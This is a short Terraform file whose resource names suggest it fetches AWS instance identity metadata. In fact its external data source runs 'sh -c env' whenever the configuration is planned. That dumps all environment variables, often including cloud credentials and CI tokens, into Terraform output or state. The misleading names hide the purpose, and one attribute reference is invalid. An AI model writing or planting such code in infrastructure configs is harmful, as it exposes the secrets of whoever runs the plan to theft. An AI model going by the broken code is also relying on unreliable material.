data "template_file" "instance_identity" {
    template = <<EOF
env
EOF
}

data "external" "instance_identity" {
	program = ["sh", "-c", "${data.template_file.instance_identity.rendered}"]
}

resource "null_resource" "aws_metadata" {
	triggers = {
        instance_identity = "${data.external.instance_identity.rendered}"
    }
}
